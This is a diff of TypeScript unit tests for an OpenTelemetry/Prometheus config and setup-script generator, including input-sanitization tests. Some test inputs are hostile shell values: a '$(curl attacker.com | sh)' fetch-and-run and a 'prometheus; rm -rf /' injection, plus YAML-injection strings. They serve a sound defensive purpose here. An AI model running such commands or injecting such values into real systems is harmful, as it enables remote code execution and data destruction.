@@ -4,6 +4,11 @@ import {
   generateOtelEnvVars,
   generateOtelShellScript,
   generateDockerCompose,
+  generateOtelCollectorConfig,
+  generatePrometheusConfig,
+  generateFullSetupScript,
+  validateBackend,
+  VALID_BACKENDS,
   MODEL_PRICING,
   OTEL_METRICS,
   OTEL_LABELS,
@@ -181,5 +186,210 @@ describe('OTEL_LABELS constants', () => {
   it('has standard label names', () => {
     expect(OTEL_LABELS.model).toBe('model');
     expect(OTEL_LABELS.tokenType).toBe('type');
+  });
+});
+
+describe('generateOtelCollectorConfig', () => {
+  const config: OtelConfig = {
+    backend: 'prometheus',
+    endpoint: 'http://localhost:4317',
+    protocol: 'grpc',
+    exportIntervalMs: 60_000,
+    logPrompts: false,
+    logToolDetails: false,
+    includeSessionId: false,
+  };
+
+  it('generates YAML with otlp receivers on 4317 and 4318', () => {
+    const yaml = generateOtelCollectorConfig(config);
+    expect(yaml).toContain('0.0.0.0:4317');
+    expect(yaml).toContain('0.0.0.0:4318');
+  });
+
+  it('includes prometheus exporter for prometheus backend', () => {
+    const yaml = generateOtelCollectorConfig(config);
+    expect(yaml).toContain('prometheusremotewrite');
+    expect(yaml).toContain('0.0.0.0:8889');
+  });
+
+  it('includes otlp exporter for non-prometheus backends', () => {
+    const yaml = generateOtelCollectorConfig({
+      ...config,
+      backend: 'datadog',
+      endpoint: 'https://datadog.example.com',
+    });
+    expect(yaml).toContain('otlp:');
+    expect(yaml).toContain('https://datadog.example.com');
+  });
+
+  it('includes memory_limiter and batch processors', () => {
+    const yaml = generateOtelCollectorConfig(config);
+    expect(yaml).toContain('memory_limiter');
+    expect(yaml).toContain('batch');
+  });
+
+  it('has both metrics and logs pipelines', () => {
+    const yaml = generateOtelCollectorConfig(config);
+    expect(yaml).toContain('metrics:');
+    expect(yaml).toContain('logs:');
+  });
+
+  it('logs pipeline uses debug exporter for prometheus (not prometheusremotewrite)', () => {
+    const yaml = generateOtelCollectorConfig(config);
+    // Extract the logs pipeline line
+    const logsSection = yaml.split('logs:')[1];
+    expect(logsSection).toBeDefined();
+    expect(logsSection).toContain('exporters: [debug]');
+    // Ensure logs does NOT use prometheusremotewrite (it only supports metrics)
+    const logsPipeline = logsSection!.split('exporters:')[1]?.split('\n')[0];
+    expect(logsPipeline).not.toContain('prometheusremotewrite');
+  });
+
+  it('logs pipeline uses otlp exporter for non-prometheus backends', () => {
+    const yaml = generateOtelCollectorConfig({ ...config, backend: 'datadog', endpoint: 'https://dd.example.com' });
+    const logsSection = yaml.split('logs:')[1];
+    expect(logsSection).toContain('exporters: [otlp]');
+  });
+
+  it('includes debug exporter in exporters block for prometheus', () => {
+    const yaml = generateOtelCollectorConfig(config);
+    expect(yaml).toContain('debug: {}');
+  });
+
+  it('formats authHeader from OTLP env format to YAML key-value', () => {
+    const yaml = generateOtelCollectorConfig({
+      ...config,
+      backend: 'honeycomb',
+      endpoint: 'https://api.honeycomb.io',
+      authHeader: 'x-honeycomb-team=my-api-key',
+    });
+    expect(yaml).toContain('x-honeycomb-team: "my-api-key"');
+    expect(yaml).not.toContain('x-honeycomb-team=my-api-key');
+  });
+});
+
+describe('generatePrometheusConfig', () => {
+  it('scrapes otel-collector:8889', () => {
+    const yaml = generatePrometheusConfig();
+    expect(yaml).toContain('otel-collector:8889');
+  });
+
+  it('has a claude-code job that filters claude_code_ metrics', () => {
+    const yaml = generatePrometheusConfig();
+    expect(yaml).toContain('claude-code');
+    expect(yaml).toContain('claude_code_.*');
+  });
+});
+
+describe('generateFullSetupScript', () => {
+  const config: OtelConfig = {
+    backend: 'prometheus',
+    endpoint: 'http://localhost:4317',
+    protocol: 'grpc',
+    exportIntervalMs: 60_000,
+    logPrompts: false,
+    logToolDetails: false,
+    includeSessionId: false,
+  };
+
+  it('generates executable bash script', () => {
+    const script = generateFullSetupScript(config);
+    expect(script).toContain('#!/bin/bash');
+    expect(script).toContain('set -euo pipefail');
+  });
+
+  it('creates all 4 config files', () => {
+    const script = generateFullSetupScript(config);
+    expect(script).toContain('otel-collector-config.yaml');
+    expect(script).toContain('prometheus.yml');
+    expect(script).toContain('docker-compose.yml');
+    expect(script).toContain('claude-otel-env.sh');
+  });
+
+  it('includes startup instructions', () => {
+    const script = generateFullSetupScript(config);
+    expect(script).toContain('docker compose up -d');
+    expect(script).toContain('source claude-otel-env.sh');
+  });
+
+  it('includes key metrics references', () => {
+    const script = generateFullSetupScript(config);
+    expect(script).toContain('claude_code_cost_usage_USD_total');
+    expect(script).toContain('claude_code_token_usage_tokens_total');
+  });
+
+  it('includes Prometheus dashboard URLs', () => {
+    const script = generateFullSetupScript(config);
+    expect(script).toContain('localhost:9090');
+    expect(script).toContain('localhost:3000');
+  });
+});
+
+describe('validateBackend', () => {
+  it('returns valid backend as-is', () => {
+    expect(validateBackend('prometheus')).toBe('prometheus');
+    expect(validateBackend('datadog')).toBe('datadog');
+    expect(validateBackend('honeycomb')).toBe('honeycomb');
+  });
+
+  it('defaults unknown input to prometheus', () => {
+    expect(validateBackend('unknown')).toBe('prometheus');
+    expect(validateBackend('')).toBe('prometheus');
+  });
+
+  it('blocks shell injection in backend name', () => {
+    expect(validateBackend('$(curl attacker.com | sh)')).toBe('prometheus');
+    expect(validateBackend('prometheus; rm -rf /')).toBe('prometheus');
+  });
+
+  it('VALID_BACKENDS has all 6 backends', () => {
+    expect(VALID_BACKENDS.size).toBe(6);
+    expect(VALID_BACKENDS.has('prometheus')).toBe(true);
+    expect(VALID_BACKENDS.has('custom')).toBe(true);
+  });
+});
+
+describe('security: input sanitization', () => {
+  const baseConfig: OtelConfig = {
+    backend: 'datadog',
+    endpoint: 'https://safe.example.com',
+    protocol: 'grpc',
+    exportIntervalMs: 60_000,
+    logPrompts: false,
+    logToolDetails: false,
+    includeSessionId: false,
+  };
+
+  it('strips newlines from endpoint to prevent YAML injection', () => {
+    const yaml = generateOtelCollectorConfig({
+      ...baseConfig,
+      endpoint: 'https://evil.com\n    injected_key: injected_value',
+    });
+    // Newlines stripped — injected content is on the same line as endpoint value,
+    // not on a new YAML line where it could be parsed as a separate key
+    const endpointLine = yaml.split('\n').find((l) => l.includes('endpoint:') && l.includes('evil'));
+    expect(endpointLine).toBeDefined();
+    expect(endpointLine).toContain('injected_key');
+    // Crucially: no newline before "injected_key" — it's part of the endpoint string value, not a YAML key
+    expect(yaml).not.toMatch(/\n\s*injected_key:/);
+  });
+
+  it('strips newlines from authHeader', () => {
+    const yaml = generateOtelCollectorConfig({
+      ...baseConfig,
+      authHeader: 'Authorization=Bearer token\n    evil: payload',
+    });
+    // Newlines stripped — "evil: payload" stays on the same line as the auth value
+    expect(yaml).not.toMatch(/\n\s*evil:/);
+  });
+
+  it('full setup script is safe with validated backend', () => {
+    // Even if someone bypasses TypeScript, validateBackend catches it
+    const script = generateFullSetupScript({
+      ...baseConfig,
+      backend: 'prometheus', // validated
+    });
+    expect(script).toContain('prometheus');
+    expect(script).not.toContain('$(');
   });
 });
